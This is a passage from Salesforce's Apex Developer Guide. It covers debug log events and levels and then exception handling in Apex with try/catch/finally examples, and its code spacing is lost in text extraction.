WorkflowEntityName:NameFieldId, rule name, rule
ID, and (if rule respects trigger types) trigger type and
recursive count
WF_CRITERIA_BEGIN
INFO and
above
WorkflowBoolean value indicating success (true or false)WF_CRITERIA_END
INFO and
above
WorkflowAction ID, rule name, and rule IDWF_EMAIL_ALERT
INFO and
above
WorkflowEmail template ID, recipients, and CC emailsWF_EMAIL_SENT
INFO and
above
WorkflowSummary of actions enqueuedWF_ENQUEUE_ACTIONS
685
Debugging ApexApex Developer Guide

Level
Logged
Category
Logged
Fields or Information Logged with EventEvent Name
INFO and
above
WorkflowCase ID and escalation dateWF_ESCALATION_ACTION
INFO and
above
WorkflowNoneWF_ESCALATION_RULE
INFO and
above
WorkflowProcess name, email template ID, and Boolean value
indicating result (true or false)
WF_EVAL_ENTRY_CRITERIA
INFO and
above
WorkflowEntityName:NameFieldId and the object
or field name
WF_FIELD_UPDATE
INFO and
above
WorkflowID of flow triggerWF_FLOW_ACTION_BEGIN
FINE and
above
WorkflowID of flow trigger, object type and ID of record whose
creation or update caused the workflow rule to fire,
name and ID of workflow rule, and the names and
values of flow variables
WF_FLOW_ACTION_DETAIL
INFO and
above
WorkflowID of flow triggerWF_FLOW_ACTION_END
ERROR and
above
WorkflowID of flow trigger, ID of flow definition, ID of flow
version, and flow error message
WF_FLOW_ACTION_ERROR
ERROR and
above
WorkflowDetailed flow error messageWF_FLOW_ACTION_ERROR_DETAIL
INFO and
above
WorkflowFormula source and valuesWF_FORMULA
INFO and
above
WorkflowNoneWF_HARD_REJECT
INFO and
above
WorkflowOwner, next owner type, and fieldWF_NEXT_APPROVER
INFO and
above
WorkflowNoneWF_NO_PROCESS_FOUND
INFO and
above
WorkflowEntityName:NameFieldId, action ID, rule
name, and rule ID
WF_OUTBOUND_MSG
INFO and
above
WorkflowProcess definition ID and process labelWF_PROCESS_FOUND
INFO and
above
WorkflowProcess nameWF_PROCESS_NODE
INFO and
above
WorkflowEntityName:NameFieldId and ownerWF_REASSIGN_RECORD
686
Debugging ApexApex Developer Guide

Level
Logged
Category
Logged
Fields or Information Logged with EventEvent Name
INFO and
above
WorkflowNotifier name, notifier email, notifier template ID, and
reply-to email
WF_RESPONSE_NOTIFY
INFO and
above
WorkflowInteger indicating orderWF_RULE_ENTRY_ORDER
INFO and
above
WorkflowRule typeWF_RULE_EVAL_BEGIN
INFO and
above
WorkflowNoneWF_RULE_EVAL_END
INFO and
above
WorkflowValueWF_RULE_EVAL_VALUE
INFO and
above
WorkflowFilter criteriaWF_RULE_FILTER
INFO and
above
WorkflowEntityName:NameFieldIdWF_RULE_INVOCATION
INFO and
above
WorkflowNoneWF_RULE_NOT_EVALUATED
INFO and
above
WorkflowProcess nameWF_SOFT_REJECT
INFO and
above
WorkflowNode typeWF_SPOOL_ACTION_BEGIN
INFO and
above
WorkflowEntityName:NameFieldId, time action,
time action container, and evaluation Datetime
WF_TIME_TRIGGER
INFO and
above
WorkflowNoneWF_TIME_TRIGGERS_BEGIN
FINER and
above
CalloutFor OData adapters, the POST body and the name and
evaluated formula for custom HTTP headers
XDS_DETAIL
(External object access via cross-org and OData
adapters for Salesforce Connect)
INFO and
above
CalloutExternal data source, external object, request details,
number of returned records, and system usage
XDS_RESPONSE
(External object access via cross-org and OData
adapters for Salesforce Connect)
FINER and
above
CalloutTruncated response from the external system,
including returned records
XDS_RESPONSE_DETAIL
(External object access via cross-org and OData
adapters for Salesforce Connect)
687
Debugging ApexApex Developer Guide

Level
Logged
Category
Logged
Fields or Information Logged with EventEvent Name
ERROR and
above
CalloutError messageXDS_RESPONSE_ERROR
(External object access via cross-org and OData
adapters for Salesforce Connect)
SEE ALSO:
Salesforce Help: Debug Log Levels
Salesforce Help: Partition Your Data with Enhanced Security Data Spaces
Salesforce Help: User Access Policies
Debugging Apex API Calls
All API calls that invoke Apex support a debug facility that allows access to detailed information about the execution of the code, including
any calls to System.debug(). The categories field of a SOAP input header called DebuggingHeader allows you to set
the logging granularity according to the levels outlined in this table.
DescriptionTypeElement Name
Specify the type of information returned in the debug log. Valid values are:LogCategorycategory
•
Db
•
Workflow
•
Validation
•
Callout
•
Apex_code
•
Apex_profiling
•
Visualforce
•
System
•
All
Specifies the level of detail returned in the debug log.
Valid log levels are (listed from lowest to highest):
LogCategoryLevellevel
•
NONE
•
ERROR
•
WARN
•
INFO
•
DEBUG
•
FINE
•
FINER
•
FINEST
688
Debugging ApexApex Developer Guide

In addition, the following log levels are still supported as part of the DebuggingHeader for backwards compatibility.
DescriptionLog Level
Does not include any log messages.NONE
Includes lower-level messages, and messages generated by calls to the System.debug
method.
DEBUGONLY
Includes log messages generated by calls to the System.debug method, and every data
manipulation language (DML) statement or inline SOQL or SOSL query.
DB
Includes log messages generated by calls to the System.debug method, every DML
statement or inline SOQL or SOSL query, and the entrance and exit of every user-defined method.
PROFILE
In addition, the end of the debug log contains overall profiling information for the portions of
the request that used the most resources. This profiling information is presented in terms of
SOQL and SOSL statements, DML operations, and Apex method invocations. These three sections
list the locations in the code that consumed the most time, in descending order of total
cumulative time. Also listed is the number of times the categories executed.
Includes the request-response XML that the server is sending and receiving from an external
web service. Useful when debugging issues related to using Lightning Platform web service
API calls or troubleshooting user access to external objects via Salesforce Connect.
CALLOUT
Includes all messages generated by the PROFILE level and the following.DETAIL
•
Variable declaration statements
•
Start of loop executions
•
All loop controls, such as break and continue
•
Thrown exceptions *
•
Static and class initialization code *
•
Any changes in the withsharing context
The corresponding output header, DebuggingInfo, contains the resulting debug log. For more information, see DebuggingHeader
in the SOAP API Developer Guide.
Debug Log Order of Precedence
Which events are logged depends on various factors. These factors include your trace flags, the default logging levels, your API header,
user-based system log enablement, and the log levels set by your entry points.
The order of precedence for debug log levels is:
1.Trace flags override all other logging logic. The Developer Console sets a trace flag when it loads, and that trace flag remains in effect
until it expires. You can set trace flags in the Developer Console or in Setup or by using the TraceFlag and DebugLevel
Tooling API objects.
Note: Setting class and trigger trace flags doesn’t cause logs to be generated or saved. Class and trigger trace flags override
other logging levels, including logging levels set by user trace flags, but they don’t cause logging to occur. If logging is enabled
when classes or triggers execute, logs are generated at the time of execution.
689
Debugging ApexApex Developer Guide

2.If you don’t have active trace flags, synchronous and asynchronous Apex tests execute with the default logging levels. Default logging
levels are:
DB
INFO
APEX_CODE
DEBUG
APEX_PROFILING
INFO
WORKFLOW
INFO
VALIDATION
INFO
CALLOUT
INFO
VISUALFORCE
INFO
SYSTEM
DEBUG
3.If no relevant trace flags are active, and no tests are running, your API header sets your logging levels. API requests that are sent
without debugging headers generate transient logs—logs that aren’t saved—unless another logging rule is in effect.
4.If your entry point sets a log level, that log level is used. For example, Visualforce requests can include a debugging parameter that
sets log levels.
If none of these cases apply, logs aren’t generated or persisted.
Exceptions in Apex
Exceptions note errors and other events that disrupt the normal flow of code execution. throw statements are used to generate
exceptions, while try, catch, and finally statements are used to gracefully recover from exceptions.
There are many ways to handle errors in your code, including using assertions like System.assert calls, or returning error codes
or Boolean values, so why use exceptions? The advantage of using exceptions is that they simplify error handling. Exceptions bubble up
from the called method to the caller, as many levels as necessary, until a catch statement is found to handle the error. This bubbling
up relieves you from writing error-handling code in each of your methods. Also, by using finally statements, you have one place
to recover from exceptions, like resetting variables and deleting data.
What Happens When an Exception Occurs?
When an exception occurs, code execution halts. Any DML operations that were processed before the exception are rolled back and
aren’t committed to the database. Exceptions get logged in debug logs. For unhandled exceptions (exceptions that the code doesn’t
catch) Salesforce sends an email that includes the exception information. The end user sees an error message in the Salesforce user
interface.
690
Debugging ApexApex Developer Guide

Unhandled Exception Emails
Tip:  Take advantage of free-tier access to Event Monitoring, and track unhandled exceptions in Apex code execution instead of
relying only on unhandled exception emails. Troubleshoot your Apex code by analyzing the information captured in the event
log files for the Apex Unexpected Exception event type.
When unhandled Apex exceptions occur, emails sent contain the Apex stack trace, exception message, customer’s org and user ID, org
name, and My Domain name. No other data is returned with the report. Unhandled exception emails are sent by default to the developer
specified in the LastModifiedBy field on the failing class or trigger. In addition, you can have emails sent to users of your Salesforce
org and to arbitrary email addresses. These email recipients can also receive process or flow error emails. To set up these email notifications,
from Setup, enter ApexExceptionEmail in the QuickFind box, then select Apex Exception Email. The entered email
addresses then apply to all managed packages in the customer's org. You can also configure Apex exception emails using Tooling API
object ApexEmailNotification.
Note:
•
If duplicate exceptions occur in Apex code that runs synchronously or asynchronously, subsequent exception emails are
suppressed and only the first email is sent. This email suppression prevents flooding of the developer’s inbox with emails about
the same error.
•
Emails aren’t sent for exceptions encountered with anonymous Apex executions or with Apex methods accessed by Aura
components and Lightning web components via the @AuraEnabled annotation.
•
Apex exception emails are limited to 10 emails per hour, per application server. Because this limit isn’t on a per-org basis, email
delivery to a particular org can be unreliable.
Unhandled Exceptions in the User Interface
If an end user runs into an exception that occurred in Apex code while using the standard user interface, an error message appears. The
error message includes text similar to the notification shown here.
Exception Statements
Exception Handling Example
Learn how exception handling works in Apex.
Built-In Exceptions and Common Methods
Catching Different Exception Types
691
Debugging ApexApex Developer Guide

Create Custom Exceptions
Exception Statements
Apex uses exceptions to note errors and other events that disrupt the normal flow of code execution. throw statements can be used
to generate exceptions, while try, catch, and finally can be used to gracefully recover from an exception.
Throw Statements
A throw statement allows you to signal that an error has occurred. To throw an exception, use the throw statement and provide it
with an exception object to provide information about the specific error. For example:
throwexceptionObject;
Try-Catch-Finally Statements
The try, catch, and finally statements can be used to gracefully recover from a thrown exception:
•
The try statement identifies a block of code in which an exception can occur.
•
The catch statement identifies a block of code that can handle a particular type of exception. A single try statement can have
zero or more associated catch statements. Each catch statement must have a unique exception type. Also, once a particular
exception type is caught in one catch block, the remaining catch blocks, if any, aren’t executed.
•
The finally statement identifies a block of code that is guaranteed to execute and allows you to clean up your code. A single
try statement can have up to one associated finally statement. Code in the finally block always executes regardless of
whether an exception was thrown or the type of exception that was thrown. Because the finally block always executes, use it
for cleanup code, such as for freeing up resources.
Syntax
The syntax of the try, catch, and finally statements is as follows.
try {
// Try block
code_block
} catch(exceptionTypevariableName) {
// Initialcatchblock.
// At leastthe catchblockor the finallyblockmustbe present.
code_block
} catch(Exceptione) {
// Optionaladditionalcatchstatementfor otherexceptiontypes.
// Notethatthe generalexceptiontype,'Exception',
// mustbe the lastcatchblockwhenit is used.
code_block
} finally{
// Finallyblock.
// At leastthe catchblockor the finallyblockmustbe present.
code_block
}
692
Debugging ApexApex Developer Guide

At least a catch block or a finally block must be present with a try block. The following is the syntax of a try-catch block.
try {
code_block
} catch(exceptionTypevariableName) {
code_block
}
// Optionaladditionalcatchblocks
The following is the syntax of a try-finally block.
try {
code_block
} finally{
code_block
}
This is a skeletal example of a try-catch-finally block.
try {
// Performsomeoperationthat
//mightcausean exception.
} catch(Exceptione) {
// Genericexceptionhandlingcodehere.
} finally{
// Performsomecleanup.
}
Exceptions that Can’t be Caught
Some special types of built-in exceptions can’t be caught. Those exceptions are associated with critical situations in the Lightning
Platform. These situations require the abortion of code execution and don’t allow for execution to resume through exception handling.
One such exception is the limit exception (System.LimitException) that the runtime throws if a governor limit such as heap
size or CPU time has been exceeded, when the maximum number of SOQL queries issued has been exceeded, an attempt is made to
retrieve more than the maximum number of records, and so on. Other examples are exceptions thrown when assertion statements fail
(through System.assert methods) or license exceptions.
When exceptions are uncatchable, catch blocks, as well as finally blocks if any, aren’t executed.
Versioned Behavior Changes
In API version 41.0 and later, unreachable statements in your code will cause compilation errors. For example, the following code block
generates a compile time error in API version 41.0 and later. The third statement can never be reached because the previous statement
throws an unconditional exception.
Booleanx = true;
thrownew NullPointerException();
x = false;
Exception Handling Example
Learn how exception handling works in Apex.
693
Debugging ApexApex Developer Guide

To see an exception in action, execute some code that causes a DML exception to be thrown. Execute the following in the Developer
Console:
Merchandise__cm = new Merchandise__c();
insertm;
The insert DML statement in the example causes a DmlException because we’re inserting a merchandise item without setting any
of its required fields. This is the exception error that you see in the debug log.
System.DmlException:Insertfailed.Firstexceptionon row 0; firsterror:
REQUIRED_FIELD_MISSING,Requiredfieldsare missing:[Description,Price,Total
Inventory]:[Description,Price,TotalInventory]
Next, execute this snippet in the Developer Console. It’s based on the previous example but includes a try-catch block.
try {
Merchandise__cm = new Merchandise__c();
insertm;
} catch(DmlExceptione) {
System.debug('Thefollowingexceptionhas occurred:' + e.getMessage());
}
Notice that the request status in the Developer Console now reports success. This is because the code handles the exception.
Any statements in the try block occurring after the exception are skipped and aren’t executed. For example, if you add a statement after
insertm;, this statement won’t be executed. Execute the following:
try {
Merchandise__cm = new Merchandise__c();
insertm;
// Thisdoesn'texecutesinceinsertcausesan exception
System.debug('Statementafterinsert.');
} catch(DmlExceptione) {
System.debug('Thefollowingexceptionhas occurred:' + e.getMessage());
}
In the new debug log entry, notice that you don’t see a debug message of Statementafterinsert. This is because this debug
statement occurs after the exception caused by the insertion and never gets executed. To continue the execution of code statements
after an exception happens, place the statement after the try-catch block. Execute this modified code snippet and notice that the debug
log now has a debug message of Statementafterinsert.
try {
Merchandise__cm = new Merchandise__c();
insertm;
} catch(DmlExceptione) {
System.debug('Thefollowingexceptionhas occurred:' + e.getMessage());
}
// Thiswillget executed
System.debug('Statementafterinsert.');
Alternatively, you can include additional try-catch blocks. This code snippet has the System.debug statement inside a second
try-catch block. Execute it to see that you get the same result as before.
try {
Merchandise__cm = new Merchandise__c();
insertm;
} catch(DmlExceptione) {
694
Debugging ApexApex Developer Guide

System.debug('Thefollowingexceptionhas occurred:' + e.getMessage());
}
try {
System.debug('Statementafterinsert.');
// Insertotherrecords
}
catch(Exceptione) {
// Handlethisexceptionhere
}
The finally block always executes regardless of what exception is thrown, and even if no exception is thrown. Let’s see it used in action.
Execute the following:
// Declarethe variableoutsidethe try-catchblock
// so thatit willbe in scopefor all blocks.
XmlStreamWriterw = null;
try {
w = new XmlStreamWriter();
w.writeStartDocument(null, '1.0');
w.writeStartElement(null, 'book', null);
w.writeCharacters('Thisis my book');
w.writeEndElement();
w.writeEndDocument();
// Performsomeotheroperations
Strings;
// Thiscausesan exceptionbecause
// the stringhasn'tbeenassigneda value.
Integeri = s.length();
} catch(Exceptione) {
System.debug('An exceptionoccurred:' + e.getMessage());
} finally{
// Thisgetsexecutedafterthe exceptionis handled
System.debug('Closingthe streamwriterin the finallyblock.');
// Closethe streamwriter
w.close();
}
The previous code snippet creates an XML stream writer and adds some XML elements. Next, an exception occurs due to accessing the
null String variable s. The catch block handles this exception. Then the finally block executes. It writes a debug message and closes the
stream writer, which frees any associated resources. Check the debug output in the debug log. You’ll see the debug message Closing
the streamwriterin the finallyblock. after the exception error. This tells you that the finally block executed
after the exception was caught.
SEE ALSO:
Create Custom Exceptions
Salesforce Developers Blog: Error Handling Best Practices for Lightning and Apex
695
Debugging ApexApex Developer Guide

Built-In Exceptions and Common Methods
Apex provides a number of built-in exception types that the runtime engine throws if errors are encountered during execution. You've
seen the DmlException in the previous example. Here is a sample of some other built-in exceptions. For a complete list of built-in
exception types, see Exception Class and Built-In Exceptions.
DmlException
Any problem with a DML statement, such as an insert statement missing a required field on a record.
This example makes use of DmlException. The insert DML statement in this example causes a DmlException because it’s inserting
a merchandise item without setting any of its required fields. This exception is caught in the catch block and the exception
message is written to the debug log using the System.debug statement.
try {
Merchandise__cm = new Merchandise__c();
insertm;
} catch(DmlExceptione) {
System.debug('Thefollowingexceptionhas occurred:' + e.getMessage());
}
ListException
Any problem with a list, such as attempting to access an index that is out of bounds.
This example creates a list and adds one element to it. Then, an attempt is made to access two elements, one at index 0, which
exists, and one at index 1, which causes a ListException to be thrown because no element exists at this index. This exception is
caught in the catch block. The System.debug statement in the catch block writes the following to the debug log: The
followingexceptionhas occurred:Listindexout of bounds:1.
try {
List<Integer> li = new List<Integer>();
li.add(15);
// Thislistcontainsonlyone element,
// but we'reattemptingto accessthe secondelement
// fromthiszero-basedlist.
Integeri1 = li[0];
Integeri2 = li[1];// Causesa ListException
} catch(ListExceptionle) {
System.debug('Thefollowingexceptionhas occurred:' + le.getMessage());
}
NullPointerException
Any problem with dereferencing a null variable.
This example creates a String variable named s but we don’t initialize it to a value, hence, it is null. Calling the contains method
on our null variable causes a NullPointerException. The exception is caught in our catch block and this is what is written to the debug
log: The followingexceptionhas occurred:Attemptto de-referencea nullobject.
try {
Strings;
Booleanb = s.contains('abc'); // Causesa NullPointerException
} catch(NullPointerExceptionnpe){
System.debug('Thefollowingexceptionhas occurred:' + npe.getMessage());
}
QueryException
Any problem with SOQL queries, such as assigning a query that returns no records or more than one record to a singleton sObject
variable.
696
Debugging ApexApex Developer Guide

The second SOQL query in this example causes a QueryException. The example assigns a Merchandise object to what is returned
from the query. Note the use of LIMIT1 in the query. This ensures that at most one object is returned from the database so we
can assign it to a single object and not a list. However, in this case, we don’t have a Merchandise named XYZ, so nothing is returned,
and the attempt to assign the return value to a single object results in a QueryException. The exception is caught in our catch block
and this is what you’ll see in the debug log: The followingexceptionhas occurred:Listhas no rows
for assignmentto SObject.
try {
// Thisstatementdoesn'tcausean exception,eventhough
// we don'thavea merchandisewithname='XYZ'.
// The listwilljustbe empty.
List<Merchandise__c>lm = [SELECTNameFROMMerchandise__cWHEREName= 'XYZ'];
// lm.size()is 0
System.debug(lm.size());
// However,thisstatementcausesa QueryExceptionbecause
// we'reassigingthe returnvalueto a Merchandise__cobject
// but no Merchandiseis returned.
Merchandise__cm = [SELECTNameFROMMerchandise__cWHEREName= 'XYZ'LIMIT1];
} catch(QueryExceptionqe) {
System.debug('Thefollowingexceptionhas occurred:' + qe.getMessage());
}
SObjectException
Any problem with sObject records, such as attempting to change a field in an update statement that can only be changed during
insert.
This example results in an SObjectException in the try block, which is caught in the catch block. The example queries an invoice
statement and selects only its Name field. It then attempts to get the Description__c field on the queried sObject, which isn’t available
because it isn’t in the list of fields queried in the SELECT statement. This results in an SObjectException. This exception is caught in
our catch block and this is what you’ll see in the debug log: The followingexceptionhas occurred:SObject
row was retrievedvia SOQLwithoutqueryingthe requestedfield:
Invoice_Statement__c.Description__c.
try {
Invoice_Statement__cinv = new Invoice_Statement__c(
Description__c='NewInvoice');
insertinv;
// Querythe invoicewe justinserted
Invoice_Statement__cv = [SELECTNameFROMInvoice_Statement__cWHEREId = :inv.Id];
// Causesan SObjectExceptionbecausewe didn'tretrieve
// the Description__cfield.
Strings = v.Description__c;
} catch(SObjectExceptionse) {
System.debug('Thefollowingexceptionhas occurred:' + se.getMessage());
}
Common Exception Methods
You can use common exception methods to get more information about an exception, such as the exception error message or the stack
trace. The previous example calls the getMessage method, which returns the error message associated with the exception. There
are other exception methods that are also available. Here are descriptions of some useful methods:
697
Debugging ApexApex Developer Guide

•
getCause: Returns the cause of the exception as an exception object.
•
getLineNumber: Returns the line number from where the exception was thrown.
•
getMessage: Returns the error message that displays for the user.
•
getStackTraceString: Returns the stack trace of a thrown exception as a string.
•
getTypeName: Returns the type of exception, such as DmlException, ListException, MathException, and so on.
Example
To find out what some of the common methods return, try running this example.
try {
Merchandise__cm = [SELECTNameFROMMerchandise__cLIMIT1];
// Causesan SObjectExceptionbecausewe didn'tretrieve
// the Total_Inventory__cfield.
Doubleinventory= m.Total_Inventory__c;
} catch(Exceptione) {
System.debug('Exceptiontypecaught:' + e.getTypeName());
System.debug('Message:' + e.getMessage());
System.debug('Cause:' + e.getCause());// returnsnull
System.debug('Linenumber:' + e.getLineNumber());
System.debug('Stacktrace:' + e.getStackTraceString());
}
The output of all System.debug statements looks like the following:
17:38:04:149USER_DEBUG[7]|DEBUG|Exceptiontypecaught:System.SObjectException
17:38:04:149USER_DEBUG[8]|DEBUG|Message:SObjectrow was retrievedvia SOQLwithout
queryingthe requestedfield:Merchandise__c.Total_Inventory__c
17:38:04:150USER_DEBUG[9]|DEBUG|Cause:null
17:38:04:150USER_DEBUG[10]|DEBUG|Linenumber:5
17:38:04:150USER_DEBUG[11]|DEBUG|Stacktrace:AnonymousBlock:line5, column1
The catch statement argument type is the generic Exception type. It caught the more specific SObjectException. You can verify that this
is so by inspecting the return value of e.getTypeName() in the debug output. The output also contains other properties of the
SObjectException, like the error message, the line number where the exception occurred, and the stack trace. You might be wondering
why getCause returned null. This is because in our sample there was no previous exception (inner exception) that caused this
exception. In Create Custom Exceptions, you’ll get to see an example where the return value of getCause is an actual exception.
More Exception Methods
Some exception types, such as DmlException, have specific exception methods that apply to only them and aren’t common to other
exception types:
•
getDmlFieldNames(Indexof the failedrecord): Returns the names of the fields that caused the error for the
specified failed record.
•
getDmlId(Indexof the failedrecord): Returns the ID of the failed record that caused the error for the specified
failed record.
•
getDmlMessage(Indexof the failedrecord): Returns the error message for the specified failed record.
•
getNumDml: Returns the number of failed records.
Example
698
Debugging ApexApex Developer Guide

This snippet makes use of the DmlException methods to get more information about the exceptions returned when inserting a list of
Merchandise objects. The list of items to insert contains three items, the last two of which don’t have required fields and cause exceptions.
Merchandise__cm1 = new Merchandise__c(
Name='Coffeemaker',
Description__c='Kitchenware',
Price__c=25,
Total_Inventory__c=1000);
// Missingthe Priceand Total_Inventoryfields
Merchandise__cm2 = new Merchandise__c(
Name='CoffeemakerB',
Description__c='Kitchenware');
// Missingall requiredfields
Merchandise__cm3 = new Merchandise__c();
Merchandise__c[]mList= new List<Merchandise__c>();
mList.add(m1);
mList.add(m2);
mList.add(m3);
try {
insertmList;
} catch(DmlExceptionde) {
IntegernumErrors= de.getNumDml();
System.debug('getNumDml='+ numErrors);
for(Integeri=0;i<numErrors;i++){
System.debug('getDmlFieldNames='+ de.getDmlFieldNames(i));
System.debug('getDmlMessage='+ de.getDmlMessage(i));
}
}
Note how the sample above didn’t include all the initial code in the try block. Only the portion of the code that could generate an
exception is wrapped inside a try block, in this case the insert statement could return a DML exception in case the input data is
not valid. The exception resulting from the insert operation is caught by the catch block that follows it. After executing this
sample, you’ll see an output of System.debug statements similar to the following:
14:01:24:939USER_DEBUG[20]|DEBUG|getNumDml=2
14:01:24:941USER_DEBUG[23]|DEBUG|getDmlFieldNames=(Price,TotalInventory)
14:01:24:941USER_DEBUG[24]|DEBUG|getDmlMessage=Requiredfieldsare missing:[Price,
TotalInventory]
14:01:24:942USER_DEBUG[23]|DEBUG|getDmlFieldNames=(Description,Price,TotalInventory)
14:01:24:942USER_DEBUG[24]|DEBUG|getDmlMessage=Requiredfieldsare missing:
[Description,Price,TotalInventory]
The number of DML failures is correctly reported as two since two items in our list fail insertion. Also, the field names that caused the
failure, and the error message for each failed record is written to the output.
699
Debugging ApexApex Developer Guide

Catching Different Exception Types
In the previous examples, we used the specific exception type in the catch block. We could have also just caught the generic Exception
type in all examples, which catches all exception types. For example, try running this example that throws an SObjectException and has
a catch statement with an argument type of Exception. The SObjectException gets caught in the catch block.
try {
Merchandise__cm = [SELECTNameFROMMerchandise__cLIMIT1];
// Causesan SObjectExceptionbecausewe didn'tretrieve
// the Total_Inventory__cfield.
Doubleinventory= m.Total_Inventory__c;
} catch(Exceptione) {
System.debug('Thefollowingexceptionhas occurred:' + e.getMessage());
}
Alternatively, you can have several catch blocks—a catch block for each exception type, and a final catch block that catches the generic
Exception type. Look at this example. Notice that it has three catch blocks.
try {
Merchandise__cm = [SELECTNameFROMMerchandise__cLIMIT1];
// Causesan SObjectExceptionbecausewe didn'tretrieve
// the Total_Inventory__cfield.
Doubleinventory= m.Total_Inventory__c;
} catch(DmlExceptione) {
System.debug('DmlExceptioncaught:' + e.getMessage());
} catch(SObjectExceptione) {
System.debug('SObjectExceptioncaught:' + e.getMessage());
} catch(Exceptione) {
System.debug('Exceptioncaught:' + e.getMessage());
}
Remember that only one catch block gets executed and the remaining ones are bypassed. This example is similar to the previous one,
except that it has a few more catch blocks. When you run this snippet, an SObjectException is thrown on this line: Doubleinventory
= m.Total_Inventory__c;. Every catch block is examined in the order specified to find a match between the thrown exception
and the exception type specified in the catch block argument:
1.The first catch block argument is of type DmlException, which doesn’t match the thrown exception (SObjectException.)
2.The second catch block argument is of type SObjectException, which matches our exception, so this block gets executed and the
following message is written to the debug log: SObjectExceptioncaught:SObjectrow was retrievedvia
SOQLwithoutqueryingthe requestedfield:Merchandise__c.Total_Inventory__c.
3.The last catch block is ignored since one catch block has already executed.
The last catch block is handy because it catches any exception type, and so catches any exception that was not caught in the previous
catch blocks. Suppose we modified the code above to cause a NullPointerException to be thrown, this exception gets caught in the last
catch block. Execute this modified example. You’ll see the following debug message: Exceptioncaught:Attemptto
de-referencea nullobject.
try {
Strings;
Booleanb = s.contains('abc'); // Causesa NullPointerException
} catch(DmlExceptione) {
System.debug('DmlExceptioncaught:' + e.getMessage());
} catch(SObjectExceptione) {
System.debug('SObjectExceptioncaught:' + e.getMessage());
} catch(Exceptione) {
700
Debugging ApexApex Developer Guide

System.debug('Exceptioncaught:' + e.getMessage());
}
Create Custom Exceptions
Custom exceptions enable you to specify detailed error messages and have more custom error handling in your catch blocks.
Exceptions can be top-level classes, that is, they can have member variables, methods and constructors, they can implement interfaces,
and so on.
To create your custom exception class, extend the built-in Exception class and make sure your class name ends with the word
Exception, such as “MyException” or “PurchaseException”. All exception classes extend the system-defined base class Exception,
and therefore, inherits all common Exception methods.
This example defines a custom exception called MyException.
publicclassMyExceptionextendsException{}
Like Java classes, user-defined exception types can form an inheritance tree, and catch blocks can catch any object in this inheritance
tree. For example:
publicclassExceptionExample{
publicvirtualclassBaseExceptionextendsException{}
publicclassOtherExceptionextendsBaseException{}
publicstaticvoidtestExtendedException(){
try {
Integeri=0;
// Yourcodehere
if (i < 5) thrownew OtherException('Thisis bad');
} catch(BaseExceptione) {
// Thiscatchesthe OtherException
System.debug(e.getMessage());
}
}
}
Here are some ways you can create your exceptions objects, which you can then throw.
You can construct exceptions:
•
With no arguments:
new MyException();
•
With a single String argument that specifies the error message:
new MyException('Thisis bad');
•
With a single Exception argument that specifies the cause and that displays in any stack trace:
new MyException(e);
•
With both a String error message and a chained exception cause that displays in any stack trace:
new MyException('Thisis bad', e);
701
Debugging ApexApex Developer Guide

Rethrowing Exceptions and Inner Exceptions
After catching an exception in a catch block, you have the option to rethrow the caught exception variable. This is useful if your method
is called by another method and you want to delegate the handling of the exception to the caller method. You can rethrow the caught
exception as an inner exception in your custom exception and have the main method catch your custom exception type.
The following example shows how to rethrow an exception as an inner exception. The example defines two custom exceptions,
My1Exception and My2Exception, and generates a stack trace with information about both.
// Definetwo customexceptions
publicclassMy1ExceptionextendsException{}
publicclassMy2ExceptionextendsException{}
try {
// Throwfirstexception
thrownew My1Exception('Firstexception');
} catch(My1Exceptione) {
// Throwsecondexceptionwiththe first
// exceptionvariableas the innerexception
thrownew My2Exception('Thrownwithinnerexception', e);
}
This is how the stack trace looks like resulting from running the code above:
15:52:21:073EXCEPTION_THROWN[7]|My1Exception:Firstexception
15:52:21:077EXCEPTION_THROWN[11]|My2Exception:Throwwithinnerexception
15:52:21:000FATAL_ERRORAnonymousBlock:line11, column1
15:52:21:000FATAL_ERRORCausedby
15:52:21:000FATAL_ERRORAnonymousBlock:line7, column1
The example in the next section shows how to handle an exception with an inner exception by calling the getCause method.
Inner Exception Example
Now that you’ve seen how to create a custom exception class and how to construct your exception objects, let’s create and run an
example that demonstrates the usefulness of custom exceptions.
1.In the Developer Console, create a class named MerchandiseException and confirm that it has this content.
publicclassMerchandiseExceptionextendsException{
}
You’ll use this exception class in the second class that you create. The curly braces at the end enclose the body of your exception
class, which we left empty because we get some free code—our class inherits all the constructors and common exception methods,
such as getMessage, from the built-in Exception class.
2.Next, create a second class named MerchandiseUtility.
publicclassMerchandiseUtility{
publicstaticvoidmainProcessing(){
try {
insertMerchandise();
} catch(MerchandiseExceptionme) {
System.debug('Message:' + me.getMessage());
702
Debugging ApexApex Developer Guide

System.debug('Cause:' + me.getCause());
System.debug('Linenumber:' + me.getLineNumber());
System.debug('Stacktrace:' + me.getStackTraceString());
}
}
publicstaticvoidinsertMerchandise(){
try {
// Insertmerchandisewithoutrequiredfields
Merchandise__cm = new Merchandise__c();
insertm;
} catch(DmlExceptione) {
// Somethinghappenedthatpreventsthe insertion
// of Employeecustomobjects,so throwa more
// specificexception.
thrownew MerchandiseException(
'Merchandiseitemcouldnot be inserted.', e);
}
}
}
This class contains the mainProcessing method, which calls insertMerchandise. The latter causes an exception by
inserting a Merchandise without required fields. The catch block catches this exception and throws a new exception, the custom
MerchandiseException you created earlier. Notice that we called a constructor for the exception that takes two arguments: the error
message, and the original exception object. You might wonder why we are passing the original exception? Because it is useful
information—when the MerchandiseException gets caught in the first method, mainProcessing, the original exception
(referred to as an inner exception) is really the cause of this exception because it occurred before the MerchandiseException.
3.Now let’s see all this in action to understand better. Execute the following:
MerchandiseUtility.mainProcessing();
4.Check the debug log output. You should see something similar to the following:
18:12:34:928USER_DEBUG[6]|DEBUG|Message:Merchandiseitemcouldnot be inserted.
18:12:34:929USER_DEBUG[7]|DEBUG|Cause:System.DmlException:Insertfailed.First
exceptionon row 0; firsterror:REQUIRED_FIELD_MISSING,Requiredfieldsare missing:
[Description,Price,TotalInventory]:[Description,Price,TotalInventory]
18:12:34:929USER_DEBUG[8]|DEBUG|Linenumber:22
18:12:34:930USER_DEBUG[9]|DEBUG|Stacktrace:
Class.EmployeeUtilityClass.insertMerchandise:line22, column1
A few items of interest:
•
The cause of MerchandiseException is the DmlException. You can see the DmlException message also that states that required
fields were missing.
•
The stack trace is line 22, which is the second time an exception was thrown. It corresponds to the throw statement of
MerchandiseException.
thrownew MerchandiseException('Merchandiseitemcouldnot be inserted.', e);
703
Debugging ApexApex Developer Guide

Testing Apex
Apex provides a testing framework that allows you to write unit tests, run your tests, check test results, and have code coverage results.
Let's talk about unit tests, data visibility for tests, and the tools that are available on the Lightning platform for testing Apex. We'll also
describe testing best practices and a testing example.
Note:  To protect the privacy of your data, make sure that test error messages and exception details don’t contain any personal
